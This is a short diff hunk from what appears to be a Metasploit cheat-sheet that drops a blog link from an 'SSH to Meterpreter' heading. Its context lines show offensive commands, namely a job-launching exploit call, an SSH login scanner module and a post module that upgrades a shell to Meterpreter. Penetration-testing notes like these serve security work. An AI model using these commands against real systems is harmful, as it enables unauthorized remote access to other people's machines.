@@ -66,7 +66,7 @@ msetg SHELL cmd.exe
 exploit -j -z
 
 -----
-SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/
+SSH to Meterpreter:
 
          use auxiliary/scanner/ssh/ssh_login
          use post/multi/manage/shell_to_meterpreter
